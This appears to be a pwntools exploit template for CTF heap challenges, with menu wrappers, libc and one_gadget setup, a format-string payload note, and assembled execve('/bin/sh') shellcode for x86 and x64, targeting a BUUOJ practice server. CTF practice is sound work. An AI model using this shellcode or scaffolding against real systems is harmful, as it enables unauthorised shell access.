from pwn import *
from pwnlib.util.proc import wait_for_debugger
import inspect, re
context.log_level = 'debug'
# context.terminal=['tmux', 'splitw', '-h']

def ida():
    wait_for_debugger(sh.pid)
def gdb():
    pwnlib.gdb.attach(sh)
def gdbaddr(addrlist,PIE=True):
    for i in addr:
        debug_str+='b *{}\n'.format(hex(i))
        pwnlib.gdb.attach(sh,debug_str) 
def gdbc(addr):
    pwnlib.gdb.attach(sh,"b *" + hex(addr) +"\n c")

def lk(a): #print leak value
    for line in inspect.getframeinfo(inspect.currentframe().f_back)[3]:
        m = re.search(r'\lk\s*\(\s*([A-Za-z_][A-Za-z0-9_]*)\s*\)', line)
        if m:
            print("!!"+m.group(1)+'========>'+hex(a))

#-----------------------------------------------------------------------------------------
s       = lambda data               :sh.send(str(data))        #in case that data is an int
sa      = lambda delim,data         :sh.sendafter(str(delim), str(data)) 
sl      = lambda data               :sh.sendline(str(data)) 
sla     = lambda delim,data         :sh.sendlineafter(str(delim), str(data)) 
r       = lambda numb=4096          :sh.read(numb)
ru      = lambda delims, drop=True  :sh.readuntil(delims, drop)
uu32    = lambda data   :u32(data.ljust(4, '\0'))
uu64    = lambda data   :u64(data.ljust(8, '\0'))

sh_x86_22=asm('''
xor     ecx,ecx;xor     edx,edx;
push    0x0B;pop     eax;
push    ecx; push    0x68732F2F  #hs//, this str must end with 0x00
push    0x6E69622F;  #nib/
mov     ebx, esp; int     0x80''', arch = 'i386', os = 'linux')#if we can use 0x00 in payload, we can delete push  ecx;
sh_x64_21=asm('''
xor  esi, esi;
push rsi; mov rdi, 0x68732F2F6E69622F; push rdi; push rsp; pop rdi; mov al, 0x3B;
cdq; syscall
''', arch = 'amd64', os = 'linux')
#https://www.exploit-db.com/shellcodes
#-----------------------------------------------------------------------------------------

def choose(index):
    sla("Command: ",str(index))

def add(size,text):
    choose(1)
    sla("Size: ",str(size))
    sla("content:",text)
    # sla("Index: ",index)

def delete(index):
    choose(3)
    sla("Index: ",str(index))

def show(index):
    choose(4)
    sla("Index: ",str(index))
    # sla("size?",size)
    # sa("Content: ",text)

def edit(index,text):
    choose(2)
    sla("Index: ",str(index))
    # sla("Size: ",size)
    sla("Content: ",text)


def exp():
    pass


if __name__ == '__main__':
    program = './yyyyyyyyyyyy'
    remoteurl="node4.buuoj.cn:27136"  #ip:port
    args1=''
    libcindex=-1 # -1 is local libc
    isremote=0 # 0 is local process, 1 is remote
    locallibc="/lib/x86_64-linux-gnu/"+re.findall(r'libc-[\d.]*so',os.popen("ls /lib/x86_64-linux-gnu/").read())[0]
    libclist=["./buu64-libc2.23.so","./buu32-libc2.23.so","./buu64-libc2.27.so","./buu32-libc2.27.so",locallibc]
    libcpath=libclist[libcindex]
    elf = ELF(program)
    #--------------------------------------------
    context.os='linux'
    context.arch=['i386' if re.findall(r'LF ([\d]*)-b',os.popen("file "+program).read())[0]=='32' else 'amd64'][0]
    libc = ELF(libcpath)
    binsh_offset = libc.search("/bin/sh").next()
    libc.sym["main_arena"]=libc.sym["__malloc_hook"]+0x10
    #64bitunsortbin: fd=main arena+88(0x58), main_arena-0X10=__malloc_hook
    #32bitunsortbin: fd=main_arena+48(0x30), main_arena-0x18=__malloc_hook
    getonegadget=os.popen("one_gadget "+libcpath).read() 
    print(getonegadget)
    one_gadgetlist=[int(li.split(" ")[0],16) for li in getonegadget.split('\n') if len(li) and li[0] not in "c "]
    while True:
        if isremote==0:
            os.system("chmod 777 "+program)
            sh = process(argv=[program,args1],env={"LD_PRELOAD":libcpath})#argv=[program,args1,args2,...]
        else:
            port=re.findall(r'([0-9]*)',remoteurl.split(':')[-1])[0]
            url=remoteurl.split(":"+str(port))[0]
            sh=remote(url,port)
        ret=exp()
        if ret:
            sh.close()
            continue
        break
    sh.interactive()
    #fmtst=fmtstr_payload(offset, {addr1:value1,addr2:value2}, numbwritten=aleayoutputlen, write_size='byte')
    #offset: input AAAA%p-%p-%p-%p-%p-%p-%p-%p-%p.and watch output, "AAAA" in which index(count from 1)
    #write_size:[byte/short/int] payload is hhn,hn,n   ;  numbwritten default = 0, write_size defalut =byte
    #-------------------------------------------------------------------------
    #if you want to burp, add below to exp():
    '''
    try:
        add(0x48)   #contain func who maybe wrong
        print ru("successstr") #you should pick a success str to judge
    except:
        return 2
    '''